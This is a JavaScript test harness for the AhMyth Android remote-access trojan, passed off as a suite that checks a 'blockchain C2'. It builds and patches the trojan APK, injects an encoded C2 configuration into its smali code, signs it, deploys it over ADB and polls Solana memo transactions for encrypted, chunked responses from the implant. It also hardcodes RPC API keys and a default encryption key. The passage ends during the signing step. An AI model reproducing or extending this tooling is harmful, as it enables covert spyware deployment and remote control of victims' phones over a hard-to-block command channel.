#!/usr/bin/env node
/**
 * Blockchain C2 Test Suite
 * Tests building, installing, and running APK with blockchain C2 connection
 */

const { Server } = require('socket.io');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { exec, spawn } = require('child_process');
const { promisify } = require('util');
const os = require('os');
const crypto = require('crypto');
const bs58 = require('bs58');
const { Connection, PublicKey } = require('@solana/web3.js');

const execAsync = promisify(exec);

// Helper to run commands with timeout and proper buffer
async function runCommand(cmd, options = {}) {
    const defaultOptions = {
        timeout: 30000,
        maxBuffer: 1024 * 1024 * 5, // 5MB buffer
        ...options
    };
    return execAsync(cmd, defaultOptions);
}

function parseCliArgs() {
    const args = process.argv.slice(2);
    const flags = new Set();
    const values = {};
    for (let i = 0; i < args.length; i++) {
        const arg = args[i];
        if (!arg.startsWith('--')) continue;
        const trimmed = arg.replace(/^--/, '');
        const eqIdx = trimmed.indexOf('=');
        if (eqIdx >= 0) {
            const key = trimmed.substring(0, eqIdx);
            const val = trimmed.substring(eqIdx + 1);
            values[key] = val;
        } else {
            const next = args[i + 1];
            if (next && !next.startsWith('--')) {
                values[trimmed] = next;
                i++;
            } else {
                flags.add(trimmed);
            }
        }
    }
    return { flags, values };
}

const CLI = parseCliArgs();
const SHOW_HELP = CLI.flags.has('help') || CLI.flags.has('h');
if (SHOW_HELP) {
    console.log(`
Usage: node test-blockchain-c2-suite.js [options]

Options:
  --emulator               Force emulator mode for ADB device selection
  --memo-only              Wait only for blockchain memo responses (skip ADB log fallback)
  --max-commands N         Limit Solana command tests to first N (default: 6)
  --full-suite             Run all Solana command tests
  --response-timeout MS    Per-command memo/log wait timeout (default: 35000)
  --test-timeout MS        Suite-level timeout (default: 900000)
  --help, -h               Show this help
`);
    process.exit(0);
}

const EMULATOR_ONLY = CLI.flags.has('emulator') || process.argv.includes('emulator') || CLI.flags.has('emulator-only') || process.argv.includes('--emulator') || process.env.ADB_PREFER_EMULATOR === '1';

// Configuration
const PORT = parseInt(process.env.PORT) || 1234;
const TEST_TIMEOUT = parseInt(CLI.values['test-timeout'] || process.env.TEST_TIMEOUT, 10) || 900000; // Allow ample time for Solana memo round-trips and multiple commands
const PACKAGE_NAME = 'ahmyth.mine.king.ahmyth';
const FACTORY_PATH = path.join(__dirname, 'AhMyth-Server', 'app', 'Factory');
const APK_FOLDER = path.join(FACTORY_PATH, 'Ahmyth');
const APKTOOL_JAR = path.join(FACTORY_PATH, 'apktool.jar');
const SIGN_JAR = path.join(FACTORY_PATH, 'sign.jar');
let IOSOCKET_PATH = path.join(APK_FOLDER, 'smali', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali');

// Get server IP address
function getServerIP() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            // Skip internal and non-IPv4 addresses
            if (iface.family === 'IPv4' && !iface.internal) {
                // Prefer 192.168.x.x or 10.x.x.x addresses
                if (iface.address.startsWith('192.168.') || iface.address.startsWith('10.')) {
                    return iface.address;
                }
            }
        }
    }
    // Fallback: get first non-internal IPv4
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                return iface.address;
            }
        }
    }
    return '192.168.0.180'; // Default fallback
}

const SERVER_IP = getServerIP();

// Load env from files + process.env
function loadEnvFile(p) {
    if (!fs.existsSync(p)) return {};
    return fs.readFileSync(p, 'utf8')
        .split(/\r?\n/)
        .reduce((acc, line) => {
            const m = line.trim().match(/^([^=#]+)=(.*)$/);
            if (m) acc[m[1].trim()] = m[2].trim();
            return acc;
        }, {});
}
const env = {
    ...loadEnvFile(path.join(__dirname, '.blockchain-keys.env')),
    ...loadEnvFile(path.join(__dirname, '.blockchain-contract.env')),
    ...process.env
};

// Blockchain C2 Configuration (default to Solana devnet with baked Alchemy key)
const DEFAULT_ALCHEMY_KEY = env.SOLANA_ALCHEMY_KEY || env.ALCHEMY_API_KEY || env.SOLANA_ALCHEMY_API_KEY || 'iYpa8brgKRSbCQ9rb1tx8';
const BLOCKCHAIN_RPC_URL = env.BLOCKCHAIN_RPC_URL || env.SOLANA_RPC_URL || `https://solana-devnet.g.alchemy.com/v2/${DEFAULT_ALCHEMY_KEY}`;
const BLOCKCHAIN_CONTRACT = env.BLOCKCHAIN_CONTRACT_ADDRESS || env.SOLANA_CHANNEL_ADDRESS || 'BByseFuCHhS8i4zrvhGbCuVm38FvYAza4dmPnqEZxBzJ';
const BLOCKCHAIN_AES_KEY = env.BLOCKCHAIN_C2_AES_KEY || '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';
const CLIENT_PRIVATE_KEY = env.BLOCKCHAIN_CLIENT_PRIVATE_KEY || env.SOLANA_CLIENT_PRIVATE_KEY;
const BLOCKCHAIN_BLOCK_STEP = parseInt(process.env.BLOCKCHAIN_BLOCK_STEP, 10) || 10;
const IS_SOLANA = !!(env.SOLANA_PYUSD_MINT || (BLOCKCHAIN_CONTRACT != null && BLOCKCHAIN_CONTRACT.length > 32) || (BLOCKCHAIN_RPC_URL != null && BLOCKCHAIN_RPC_URL.includes("solana")));
const MEMO_ONLY = CLI.flags.has('memo-only') || CLI.values['memo-only'] === '1' || process.env.SOLANA_MEMO_ONLY === '1' || process.argv.includes('--memo-only');

// Propagate blockchain config to process.env so downstream imports (e.g., blockchain-operator)
// see the correct Solana values.
process.env.BLOCKCHAIN_RPC_URL = BLOCKCHAIN_RPC_URL;
process.env.SOLANA_RPC_URL = BLOCKCHAIN_RPC_URL;
process.env.BLOCKCHAIN_CONTRACT_ADDRESS = BLOCKCHAIN_CONTRACT;
process.env.SOLANA_CHANNEL_ADDRESS = BLOCKCHAIN_CONTRACT;
process.env.BLOCKCHAIN_C2_AES_KEY = BLOCKCHAIN_AES_KEY;
// Use alternate ADB server port to avoid conflicts with existing daemons
process.env.ADB_SERVER_PORT = process.env.ADB_SERVER_PORT || '5040';
process.env.ANDROID_ADB_SERVER_PORT = process.env.ANDROID_ADB_SERVER_PORT || process.env.ADB_SERVER_PORT;
if (env.BLOCKCHAIN_PRIVATE_KEY) {
    process.env.BLOCKCHAIN_PRIVATE_KEY = env.BLOCKCHAIN_PRIVATE_KEY;
}
if (CLIENT_PRIVATE_KEY) {
    process.env.BLOCKCHAIN_CLIENT_PRIVATE_KEY = CLIENT_PRIVATE_KEY;
    process.env.SOLANA_CLIENT_PRIVATE_KEY = CLIENT_PRIVATE_KEY;
}

// Colors for output
const colors = {
    reset: "\x1b[0m",
    red: "\x1b[31m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    cyan: "\x1b[36m",
    magenta: "\x1b[35m",
    blue: "\x1b[34m",
    gray: "\x1b[90m"
};

let testResults = [];
let clientSocket = null;
let deviceInfo = null;
let server = null;
let io = null;

let adbPort = process.env.ADB_SERVER_PORT || '5040';
const ADB_BIN = process.env.ADB || 'adb';
const adbCmd = (cmd) => `${ADB_BIN} -P ${adbPort} ${cmd}`;

function log(msg, type = 'info') {
    const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
    let color = colors.reset;
    switch(type) {
        case 'success': color = colors.green; break;
        case 'error': color = colors.red; break;
        case 'warn': color = colors.yellow; break;
        case 'header': color = colors.cyan; break;
        case 'debug': color = colors.blue; break;
        case 'info': color = colors.gray; break;
    }
    console.log(`${color}[${timestamp}] ${msg}${colors.reset}`);
}

// Ensure we have a responsive ADB server port; avoid hanging when a port is occupied by another process
async function ensureAdbPort() {
    const candidates = Array.from(new Set([adbPort, '5041', '5037', '5038']));
    let lastErr = null;

    for (const port of candidates) {
        try {
            const { stdout } = await runCommand(`${ADB_BIN} -P ${port} devices`, { timeout: 8000 });
            if (stdout && stdout.includes('List of devices')) {
                if (port !== adbPort) {
                    log(`ADB port ${adbPort} unavailable; switching to ${port}`, 'warn');
                }
                adbPort = port;
                process.env.ADB_SERVER_PORT = port;
                process.env.ANDROID_ADB_SERVER_PORT = port;
                return port;
            }
        } catch (err) {
            lastErr = err;
            log(`ADB not responding on port ${port}: ${err.message}`, 'warn');
        }
    }

    throw lastErr || new Error('Unable to reach ADB on any candidate port');
}

async function restartAdbServer() {
    const envVars = { ...process.env, ADB_SERVER_PORT: adbPort, ANDROID_ADB_SERVER_PORT: adbPort };
    await runCommand(`${ADB_BIN} -P ${adbPort} kill-server`, { timeout: 5000, env: envVars }).catch(() => {});
    await runCommand(`${ADB_BIN} -P ${adbPort} start-server`, { timeout: 8000, env: envVars }).catch(() => {});
}

// Solana helpers (memo-based C2)
const MEMO_PROGRAM_ID = new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
function getSolanaRpcCandidates() {
    const preferredAlchemy = `https://solana-devnet.g.alchemy.com/v2/${DEFAULT_ALCHEMY_KEY}`;
    const ankrWithKey = 'https://rpc.ankr.com/solana_devnet/60fcedc56f29eab1f0c4e040224603b5bad3b8e3d9e409302d2d10ff02a5624c';
    const candidates = [
        preferredAlchemy,
        ankrWithKey,
        BLOCKCHAIN_RPC_URL,
        env.SOLANA_RPC_URL,
        'https://api.devnet.solana.com'
    ];
    // Deduplicate while preserving order
    const seen = new Set();
    const list = [];
    for (const url of candidates) {
        if (!url || seen.has(url)) continue;
        seen.add(url);
        list.push(url);
    }
    // Shuffle to spread load and reduce repeat 429s
    for (let i = list.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [list[i], list[j]] = [list[j], list[i]];
    }
    return list;
}

async function createSolanaConnection() {
    let lastErr = null;
    const candidates = getSolanaRpcCandidates();
    for (const rpc of candidates) {
        try {
            const conn = new Connection(rpc, 'confirmed');
            await conn.getLatestBlockhash('confirmed');
            log(`Solana RPC healthy: ${rpc}`, 'info');
            return { connection: conn, rpc };
        } catch (e) {
            lastErr = e;
            log(`RPC candidate failed (${rpc}): ${e.message}`, 'warn');
        }
    }
    throw lastErr || new Error('No Solana RPC endpoint available');
}

function normalizeAesKey(keyHex) {
    if (!keyHex) return null;
    return keyHex.startsWith('0x') ? keyHex.substring(2) : keyHex;
}

function decryptMemoPayload(hexPayload) {
    try {
        const clean = hexPayload.startsWith('0x') ? hexPayload.substring(2) : hexPayload;
        const bytes = Buffer.from(clean, 'hex');
        if (bytes.length < 12 + 16) return null;
        const nonce = bytes.slice(0, 12);
        const ciphertext = bytes.slice(12, -16);
        const tag = bytes.slice(-16);

        const decipher = crypto.createDecipheriv('aes-256-gcm', Buffer.from(normalizeAesKey(BLOCKCHAIN_AES_KEY), 'hex'), nonce);
        decipher.setAuthTag(tag);
        const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
        return decrypted.toString('utf8');
    } catch (e) {
        log(`Failed to decrypt memo payload: ${e.message}`, 'warn');
        return null;
    }
}

function derivePublicKeyFromPrivate(secret) {
    try {
        if (!secret) return null;
        const decoded = bs58.decode(secret);
        if (decoded.length !== 64) return null;
        const pub = decoded.slice(32);
        return bs58.encode(pub);
    } catch (e) {
        return null;
    }
}

function extractMemosFromTransaction(tx) {
    if (!tx || !tx.transaction || !tx.transaction.message) return [];
    const message = tx.transaction.message;
    const accountKeys = (message.accountKeys || []).map((k) => (k.pubkey ? k.pubkey.toString() : k.toString()));
    const memos = [];
    const instructions = message.instructions || [];
    for (const instr of instructions) {
        // Parsed memo
        if (instr.parsed && instr.parsed.type === 'memo' && instr.parsed.info && instr.parsed.info.memo) {
            memos.push(instr.parsed.info.memo);
            continue;
        }
        // ProgramId check
        const programId = instr.programId || null;
        let programMatches = false;
        if (programId && programId.toString && programId.toString() === MEMO_PROGRAM_ID.toString()) {
            programMatches = true;
        } else if (instr.programIdIndex != null && instr.programIdIndex < accountKeys.length) {
            programMatches = accountKeys[instr.programIdIndex] === MEMO_PROGRAM_ID.toString();
        }
        if (programMatches) {
            const parsedMemo = typeof instr.parsed === 'string'
                ? instr.parsed
                : instr.parsed?.info?.memo;
            const data = instr.data || parsedMemo;
            if (typeof data === 'string') {
                if (data.startsWith('RESP:') || data.startsWith('RESPCH:') || data.startsWith('CMD:')) {
                    memos.push(data);
                } else {
                    try {
                        memos.push(Buffer.from(bs58.decode(data)).toString('utf8'));
                    } catch (e) {
                        // ignore decoding errors
                    }
                }
            }
        }
    }
    return memos;
}

async function pollForResponseMemo(connection, channelPubkey, seenSignatures, expectedEvent, timeoutMs = 60000) {
    const start = Date.now();
    const wait = (ms) => new Promise((r) => setTimeout(r, ms));
    const pollInterval = 1500; // faster polling to surface responses quickly
    const rpcList = getSolanaRpcCandidates();
    let rpcIndex = 0;
    const rpcBackoffUntil = new Map(); // rpc -> timestamp until which it is skipped
    const chunkBuffers = new Map(); // id -> { total, parts: [], received }
    const chunkNotes = [];
    // pre-shuffle already; loop will cycle

    async function rpcCall(rpc, method, params) {
        const controller = new AbortController();
        const t = setTimeout(() => controller.abort(), 6000);
        try {
            const res = await fetch(rpc, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
                signal: controller.signal
            });
            if (!res.ok) throw new Error(`HTTP ${res.status}`);
            const json = await res.json();
            if (json.error) throw new Error(json.error.message || 'RPC error');
            return json.result;
        } finally {
            clearTimeout(t);
        }
    }

    while (Date.now() - start < timeoutMs) {
        let rpc = null;
        for (let i = 0; i < rpcList.length; i++) {
            const candidate = rpcList[rpcIndex % rpcList.length];
            rpcIndex++;
            const backoff = rpcBackoffUntil.get(candidate);
            if (backoff && backoff > Date.now()) {
                continue;
            }
            rpc = candidate;
            break;
        }
        if (!rpc) {
            await wait(500);
            continue;
        }
        try {
            const sigInfos = await rpcCall(rpc, 'getSignaturesForAddress', [
                channelPubkey.toBase58(),
                { limit: 25, commitment: 'confirmed' }
            ]);
            if (Array.isArray(sigInfos)) {
                for (const info of sigInfos) {
                    if (!info || !info.signature) continue;
                    if (seenSignatures.has(info.signature)) continue;
                    seenSignatures.add(info.signature);
                    try {
                        const tx = await rpcCall(rpc, 'getTransaction', [
                            info.signature,
                            { encoding: 'jsonParsed', commitment: 'confirmed', maxSupportedTransactionVersion: 0 }
                        ]);
                        const memos = extractMemosFromTransaction(tx);
                        for (const memo of memos) {
                            if (!memo) continue;
                            if (memo.startsWith('RESPCH:')) {
                                // Chunked memo: RESPCH:<id>:<part>/<total>:<hex>
                                const m = memo.match(/^RESPCH:([A-Za-z0-9]+):([0-9]+)\/([0-9]+):([0-9a-fA-F]+)$/);
                                if (!m) continue;
                                const chunkId = m[1];
                                const part = parseInt(m[2], 10);
                                const total = parseInt(m[3], 10);
                                const chunkHex = m[4];
                                if (part <= 0 || part > total) continue;
                                let entry = chunkBuffers.get(chunkId);
                                if (!entry) {
                                    entry = { total, parts: new Array(total).fill(null), received: 0 };
                                }
                                if (entry.total !== total) {
                                    // mismatch, discard
                                    continue;
                                }
                                if (!entry.parts[part - 1]) {
                                    entry.parts[part - 1] = chunkHex;
                                    entry.received += 1;
                                    const note = `Chunk ${part}/${total} for ${chunkId} received`;
                                    chunkNotes.push(note);
                                    log(note, 'info');
                                }
                                chunkBuffers.set(chunkId, entry);
                                if (entry.received === entry.total) {
                                    const assembled = entry.parts.join('');
                                    chunkBuffers.delete(chunkId);
                                    log(`Assembled chunked memo ${chunkId} totalLen=${assembled.length} hex`, 'debug');
                                    const decrypted = decryptMemoPayload(assembled);
                                    if (!decrypted) {
                                        log(`Failed to decrypt assembled chunks for ${chunkId}`, 'warn');
                                        continue;
                                    }
                                    try {
                                        const parsed = JSON.parse(decrypted);
                                        log(`Assembled response ${chunkId} (${entry.total} parts) for ${parsed.event}`, 'info');
                                        if (!expectedEvent || parsed.event === expectedEvent) {
                                            return parsed;
                                        }
                                    } catch (e) {
                                        // ignore
                                    }
                                } else {
                                    // show progress if not complete
                                    const note = `Waiting for chunks ${entry.received}/${entry.total} for ${chunkId}`;
                                    chunkNotes.push(note);
                                    log(note, 'debug');
                                }
                                continue;
                            }

                            if (memo.startsWith('RESP:')) {
                                const decrypted = decryptMemoPayload(memo.substring(5));
                                if (!decrypted) continue;
                                try {
                                    const parsed = JSON.parse(decrypted);
                                    if (!expectedEvent || parsed.event === expectedEvent) {
                                        return parsed;
                                    }
                                } catch (e) {
                                    // ignore
                                }
                            }
                        }
                    } catch (innerErr) {
                        // ignore per-signature errors
                    }
                }
            }
        } catch (err) {
            const msg = err.message || '';
            if (msg.includes('WebSocket is disabled') || msg.includes('403')) {
                log(`Response poll skipping RPC (${rpc}): ${msg}`, 'warn');
                continue;
            }
            if (msg.toLowerCase().includes('unauthorized') || msg.toLowerCase().includes('api key')) {
                rpcBackoffUntil.set(rpc, Date.now() + 5 * 60 * 1000);
                log(`Response poll dropping RPC for 5m (${rpc}): ${msg}`, 'warn');
                continue;
            }
            if (msg.includes('429')) {
                rpcBackoffUntil.set(rpc, Date.now() + 45000);
                log(`Response poll backoff (${rpc}) after 429`, 'warn');
                continue;
            }
            log(`Response poll RPC error (${rpc}): ${msg}`, 'warn');
        }
        await wait(pollInterval);
    }
    const partials = Array.from(chunkBuffers.entries())
        .map(([id, entry]) => `${id}:${entry.received}/${entry.total}`)
        .join(', ');
    const chunkMsg = partials ? `; partial chunks: ${partials}` : '';
    // Final rescue scan ignoring seenSignatures to catch slow memos
    for (const rpc of rpcList) {
        try {
            const sigInfos = await rpcCall(rpc, 'getSignaturesForAddress', [
                channelPubkey.toBase58(),
                { limit: 80, commitment: 'confirmed' }
            ]);
            for (const info of sigInfos) {
                const tx = await rpcCall(rpc, 'getTransaction', [
                    info.signature,
                    { encoding: 'jsonParsed', commitment: 'confirmed', maxSupportedTransactionVersion: 0 }
                ]);
                const memos = extractMemosFromTransaction(tx);
                for (const memo of memos) {
                    if (!memo) continue;
                    if (memo.startsWith('RESP:')) {
                        const dec = decryptMemoPayload(memo.substring(5));
                        try {
                            const parsed = JSON.parse(dec || '{}');
                            if (!expectedEvent || parsed.event === expectedEvent) {
                                log(`Rescue scan found ${expectedEvent} via memo ${info.signature} (rpc ${rpc})`, 'info');
                                return parsed;
                            }
                        } catch {}
                    }
                }
            }
        } catch (e) {
            const msg = e.message || '';
            const level = msg.includes('429') ? 'info' : 'warn';
            log(`Rescue scan failed (${rpc}): ${msg}`, level);
        }
    }
    throw new Error(`No blockchain response for ${expectedEvent} within timeout${chunkMsg}`);
}

// Fallback: check device logcat for BlockchainResponseSender emission
async function waitForResponseLog(deviceId, eventName, timeoutMs = 45000) {
    const start = Date.now();
    const logCmd = adbCmd(`-s ${deviceId} logcat -d -s BlockchainResponseSender:D BlockchainEventPoller:D ConnectionManager:D *:S`);
    while (Date.now() - start < timeoutMs) {
        try {
            const { stdout } = await execAsync(logCmd, { maxBuffer: 1024 * 1024 * 8, timeout: 15000 });
            const lines = stdout.split('\n');
            const sendLine = lines.find(l => l.includes(`Sending response: ${eventName}`));
            const emitLine = lines.find(l => l.includes(`emitResponse -> ${eventName}`));
            const execLine = lines.find(l => l.toLowerCase().includes(`executing ${eventName}`) || l.toLowerCase().includes(`exec ${eventName.toLowerCase()}`));
            const collected = lines.filter(l => l.toLowerCase().includes(eventName.toLowerCase()) || l.toLowerCase().includes('blockchainresponsesender') || l.toLowerCase().includes('blockchaineventpoller')).slice(-8);
            if (sendLine || emitLine || execLine) {
                let preview = null;
                if (emitLine) {
                    const m = emitLine.match(/emitResponse -> .*?: (.*)$/);
                    if (m && m[1]) {
                        preview = m[1].trim();
                    }
                }
                return { found: true, preview, lines: collected };
            }
        } catch (e) {
            // ignore adb hiccups
        }
        await new Promise(r => setTimeout(r, 3000));
    }
    return { found: false, preview: null };
}

async function snapshotExistingSignatures(connection, channelPubkey) {
    const seen = new Set();
    try {
        const sigInfos = await connection.getSignaturesForAddress(channelPubkey, { limit: 40, commitment: 'confirmed' });
        sigInfos.forEach((info) => seen.add(info.signature));
    } catch (e) {
        log(`Failed to snapshot signatures: ${e.message}`, 'warn');
    }
    return seen;
}

async function ensureEmulatorRunning() {
    try {
        const existing = await checkAdbDevice();
        if (existing) return existing;
        if (!EMULATOR_ONLY) return null;
        log('No device detected. Starting emulator...', 'info');
        await restartAdbServer();
        const envVars = { ...process.env, ADB_SERVER_PORT: adbPort, ANDROID_ADB_SERVER_PORT: adbPort };
        await execAsync('node scripts/emulator.js --avd', {
            timeout: 300000,
            maxBuffer: 1024 * 1024 * 10,
            env: envVars
        });
        // Give emulator a moment to finish booting
        await new Promise((r) => setTimeout(r, 5000));
        // Wait for an online device after launch
        for (let i = 0; i < 15; i++) {
            const ready = await checkAdbDevice();
            if (ready) return ready;
            await new Promise((r) => setTimeout(r, 5000));
        }
    } catch (e) {
        log(`Failed to start emulator: ${e.message}`, 'error');
    }
    return checkAdbDevice();
}

// Utility: Check ADB device
async function checkAdbDevice() {
    try {
        await ensureAdbPort();
        const { stdout } = await runCommand(adbCmd('devices'), { timeout: 8000 });
        const lines = stdout.split('\n').filter(line => line.trim() && !line.includes('List of devices'));
        const deviceLines = lines.filter(lineHasDevice);
        const devices = deviceLines
            .map(line => line.split('\t')[0].trim())
            .filter(id => id);

        const emulators = devices.filter(id => id.startsWith('emulator-'));
        let chosen = null;
        if (EMULATOR_ONLY && emulators.length > 0) {
            chosen = emulators[0];
        } else if (!EMULATOR_ONLY && devices.length > 0) {
            chosen = devices[0];
        } else if (emulators.length > 0) {
            chosen = emulators[0];
        }

        if (!chosen) {
            log('No ADB devices found', 'error');
            return null;
        }

        log(`Found device: ${chosen}`, 'success');
        return chosen;
    } catch (e) {
        log(`ADB check failed: ${e.message}`, 'error');
        return null;
    }
}

function lineHasDevice(line) {
    return line.includes('device') && !line.includes('offline') && !line.includes('unauthorized');
}

// Utility: Build APK with blockchain C2 configuration
async function buildBlockchainC2Apk() {
    log('Building APK with Blockchain C2 configuration...', 'header');

    // Always rebuild from source to ensure latest Solana code is included
    const clientDir = path.join(__dirname, 'AhMyth-Client');
    const gradleCmd = process.platform === 'win32' ? 'gradlew.bat assembleDebug --no-daemon' : './gradlew assembleDebug --no-daemon';
    log('Running Gradle build (assembleDebug)...', 'info');
    await execAsync(gradleCmd, {
        cwd: clientDir,
        timeout: 240000,
        maxBuffer: 1024 * 1024 * 20
    });

    // Copy built APK into Factory for apktool processing
    const builtApk = path.join(clientDir, 'app', 'build', 'outputs', 'apk', 'debug', 'app-debug.apk');
    const factoryApk = path.join(FACTORY_PATH, 'Ahmyth.apk');
    if (!fs.existsSync(builtApk)) {
        throw new Error(`Built APK not found at ${builtApk}`);
    }
    fs.copyFileSync(builtApk, factoryApk);
    log('Copied fresh APK to Factory folder', 'info');

    // Decompile fresh copy so IOSocket.smali matches the new source
    if (fs.existsSync(APK_FOLDER)) {
        log('Removing old decompiled folder...', 'info');
        fs.rmSync(APK_FOLDER, { recursive: true, force: true });
    }
    log('Decompiling APK with apktool...', 'info');
    await execAsync(`java -jar "${APKTOOL_JAR}" d "${factoryApk}" -o "${APK_FOLDER}" -f`, {
        cwd: FACTORY_PATH,
        timeout: 180000,
        maxBuffer: 1024 * 1024 * 20
    });

    // Reset IOSocket path now that the folder was rebuilt
    IOSOCKET_PATH = path.join(APK_FOLDER, 'smali', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali');
    // Check if IOSocket file exists
    if (!fs.existsSync(IOSOCKET_PATH)) {
        // Try alternative paths
        const altPaths = [
            path.join(APK_FOLDER, 'smali_classes2', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali'),
            path.join(APK_FOLDER, 'smali_classes3', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali')
        ];
        
        let found = false;
        for (const altPath of altPaths) {
            if (fs.existsSync(altPath)) {
                IOSOCKET_PATH = altPath;
                found = true;
                log(`Found IOSocket at: ${altPath}`, 'info');
                break;
            }
        }
        
        if (!found) {
            throw new Error('IOSocket.smali not found in any expected location');
        }
    }
    
    // Read IOSocket file
    let content = fs.readFileSync(IOSOCKET_PATH, 'utf8');
    
    log(`IOSocket file size: ${content.length} bytes`, 'debug');
    
    // Create blockchain C2 configuration JSON
    const configObj = {
        type: 'blockchain',
        rpcUrl: BLOCKCHAIN_RPC_URL,
        contractAddress: BLOCKCHAIN_CONTRACT,
        aesKey: BLOCKCHAIN_AES_KEY
        // Note: No server IP/port - uses blockchain events instead of Socket.IO
        // Note: blockStep and candidatesPerCycle not needed for event-based polling
    };
    if (CLIENT_PRIVATE_KEY) {
        configObj.clientPrivateKey = CLIENT_PRIVATE_KEY;
        log('Client private key injected for blockchain responses', 'info');
    }
    const configJson = JSON.stringify(configObj);
    
    // Encode to base64
    const base64Config = Buffer.from(configJson).toString('base64');
    const blockchainMarker = `BLOCKCHAIN_C2_CONFIG:${base64Config}`;
    
    // Find and replace URL using multiple pattern strategies
    let replaced = false;
    
    // Strategy 0: Check if already has BLOCKCHAIN_C2_CONFIG and replace it
    // Match the config including any query parameters that might be appended
    const existingBlockchainPattern = /BLOCKCHAIN_C2_CONFIG:[A-Za-z0-9+/=]+(\?model=)?/;
    if (existingBlockchainPattern.test(content)) {
        // Replace the blockchain config part, but preserve any query parameters that come after
        content = content.replace(/BLOCKCHAIN_C2_CONFIG:[A-Za-z0-9+/=]+/, blockchainMarker);
        replaced = true;
        log('Replaced existing blockchain C2 config', 'debug');
    }
    
    // Strategy 1: Look for const-string with full URL including ?model=
    if (!replaced) {
        const fullUrlPattern = /const-string\s+v\d+,\s*"http:\/\/[^"]+\?model="/;
        if (fullUrlPattern.test(content)) {
            content = content.replace(fullUrlPattern, (match) => {
                // Replace the URL part but keep the const-string structure
                return match.replace(/http:\/\/[^"]+\?model=/, `${blockchainMarker}?model=`);
            });
            replaced = true;
            log('URL replaced using full URL const-string pattern', 'debug');
        }
    }
    
    // Strategy 2: Look for const-string with just http://IP:PORT (urlTemplate)
    if (!replaced) {
        const urlTemplatePattern = /const-string\s+v\d+,\s*"http:\/\/\d+\.\d+\.\d+\.\d+:\d+"/;
        if (urlTemplatePattern.test(content)) {
            content = content.replace(urlTemplatePattern, (match) => {
                return match.replace(/"http:\/\/\d+\.\d+\.\d+\.\d+:\d+"/, `"${blockchainMarker}"`);
            });
            replaced = true;
            log('URL replaced using urlTemplate const-string pattern', 'debug');
        }
    }
    
    // Strategy 3: Regex pattern matching (like PowerShell script) - handles multi-line strings
    if (!replaced) {
        const urlPattern = /http:\/\/[^"`\s\n]+:\d+/;
        if (urlPattern.test(content)) {
            content = content.replace(urlPattern, blockchainMarker);
            replaced = true;
            log('URL replaced using regex pattern', 'debug');
        }
    }
    
    // Strategy 4: Look for BLOCKCHAIN_C2_CONFIG that spans multiple lines (smali can split long strings)
    if (!replaced) {
        const multiLineBlockchainPattern = /BLOCKCHAIN_C2_CONFIG:[A-Za-z0-9+/=\s\n]+/;
        if (multiLineBlockchainPattern.test(content)) {
            // Find the start and end of the existing config
            const startIdx = content.indexOf('BLOCKCHAIN_C2_CONFIG:');
            if (startIdx !== -1) {
                // Find where it ends (look for ?model= or next const-string)
                let endIdx = content.indexOf('?model=', startIdx);
                if (endIdx === -1) {
                    endIdx = content.indexOf('\n    const-string', startIdx);
                    if (endIdx === -1) {
                        endIdx = content.indexOf('"', startIdx + 100);
                    }
                }
                if (endIdx > startIdx) {
                    content = content.substring(0, startIdx) + blockchainMarker + content.substring(endIdx);
                    replaced = true;
                    log('Replaced multi-line blockchain C2 config', 'debug');
                }
            }
        }
    }
    
    // Strategy 5: Simple string search for http://
    if (!replaced) {
        const startIdx = content.indexOf('http://');
        if (startIdx !== -1) {
            // Find end of URL
            let endIdx = content.indexOf('?model=', startIdx);
            if (endIdx === -1) {
                endIdx = content.indexOf('"', startIdx);
                if (endIdx === -1) {
                    endIdx = content.indexOf('\n', startIdx);
                    if (endIdx === -1) {
                        endIdx = content.indexOf(' ', startIdx);
                        if (endIdx === -1) {
                            endIdx = startIdx + 50; // Fallback
                        }
                    }
                }
            }
            
            if (endIdx > startIdx) {
                content = content.substring(0, startIdx) + blockchainMarker + content.substring(endIdx);
                replaced = true;
                log('URL replaced using string search', 'debug');
            }
        }
    }
    
    if (!replaced) {
        // Show sample content for debugging
        log('Could not find URL pattern. Showing file content sample:', 'error');
        // Look for any URL-related content
        const urlIdx = content.indexOf('url') || content.indexOf('URL') || content.indexOf('http');
        const sampleStart = Math.max(0, (urlIdx !== -1 ? urlIdx : 0) - 200);
        const sampleEnd = Math.min(content.length, sampleStart + 800);
        log(content.substring(sampleStart, sampleEnd), 'error');
        throw new Error('Could not find URL pattern in IOSocket.smali. File may be in unexpected format.');
    }
    
    // Write back
    fs.writeFileSync(IOSOCKET_PATH, content, 'utf8');
    log('Blockchain C2 configuration injected', 'success');
    
    // Build APK
    log('Compiling APK...', 'info');
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-').split('T')[0];
    const outputApk = path.join(FACTORY_PATH, `Ahmyth-blockchain-${timestamp}.apk`);
    
    const buildCmd = `java -jar "${APKTOOL_JAR}" b "${APK_FOLDER}" -o "${outputApk}"`;
    const { stdout, stderr } = await execAsync(buildCmd, { cwd: FACTORY_PATH });
    
    if (!fs.existsSync(outputApk)) {
        throw new Error('APK build failed - output file not found');
    }
    
    log('APK compiled successfully', 'success');
    
    // Sign APK
    log('Signing APK...', 'info');
    const signedApk = outputApk.replace('.apk', '-signed.apk');
    try { fs.rmSync(signedApk, { force: true }); } catch (_) {}
    try { fs.rmSync(`${signedApk}.idsig`, { force: true }); } catch (_) {}
    const altSigned = outputApk.replace('.apk', '-aligned-debugSigned.apk');
    try { fs.rmSync(altSigned, { force: true }); } catch (_) {}
    try { fs.rmSync(`${altSigned}.idsig`, { force: true }); } catch (_) {}
    const signCmd = `java -jar "${SIGN_JAR}" -a "${outputApk}"`;
    try {
        await execAsync(signCmd, { cwd: FACTORY_PATH });
